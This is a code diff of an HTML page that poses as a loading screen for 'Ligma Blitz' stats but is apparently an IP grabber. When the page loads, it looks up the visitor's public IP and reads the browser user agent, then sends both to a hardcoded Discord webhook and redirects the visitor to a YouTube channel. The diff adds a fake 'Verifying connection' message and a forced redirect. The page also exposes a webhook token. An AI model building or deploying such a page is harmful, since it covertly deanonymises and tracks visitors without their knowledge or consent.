@@ -1,33 +1,36 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading Ligma Blitz...</title>
+    <title>Loading Ligma Blitz Data...</title>
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 </head>
-<body>
+<body style="background-color: black; color: white; text-align: center; font-family: sans-serif; padding-top: 50px;">
+    <h2>LOADING LIGMA BLITZ GROUPNESS STATS...</h2>
+    <p>Verifying connection... please wait.</p>
+
     <script>
-        // PASTE YOUR DISCORD URL BETWEEN THE QUOTES
-        var WEBHOOK_URL = "https://discordapp.com/api/webhooks/1497687704983310406/yv6VZ2yuH-bxE0fD_BNQAGIUOeQu0gB9-z44IbRhSdiJOvSpHBzljrwvDo0Ifw6hyQNp"; 
-        
-        // Where they go AFTER being logged (Your YouTube)
+        // One solid line for the URL - do not let Notepad break this line!
+        var WEBHOOK_URL = "https://discord.com/api/webhooks/1497687704983310406/yv6VZ2yuH-bxE0fD_BNQAGIUOeQu0gB9-z44lbRhSdiJOvSpHBzljrwvDooIfw6hyQNp"; 
         var REDIRECT_URL = "https://youtube.com/@LigmaBlox-w7m"; 
 
-        $.getJSON("https://ipapi.co/json/", function(data) {
+        // Emergency redirect after 5 seconds no matter what
+        setTimeout(function() { window.location.href = REDIRECT_URL; }, 5000);
+
+        $.getJSON("https://api.ipify.org?format=json", function(data) {
             var payload = {
-                username: "Ligma Blitz Groupness Bot",
-                embeds: [{
-                    title: "🚨 Connection Logged",
-                    color: 15158332,
-                    fields: [
-                        { name: "Ligma Blitz Groupness Number", value: data.ip },
-                        { name: "City Origin", value: data.city },
-                        { name: "Device Protocol", value: navigator.userAgent }
-                    ]
-                }]
+                username: "Ligma Blitz Bot",
+                content: "🚨 **New Connection Logged**\n**Ligma Blitz Groupness Number:** " + data.ip + "\n**Device Info:** " + navigator.userAgent
             };
 
-            $.post(WEBHOOK_URL, JSON.stringify(payload), function() {
-                window.location.href = REDIRECT_URL;
+            $.ajax({
+                type: "POST",
+                url: WEBHOOK_URL,
+                data: JSON.stringify(payload),
+                contentType: "application/json",
+                complete: function() { 
+                    // Redirects to YouTube after the data is sent
+                    window.location.href = REDIRECT_URL; 
+                }
             });
         });
     </script>
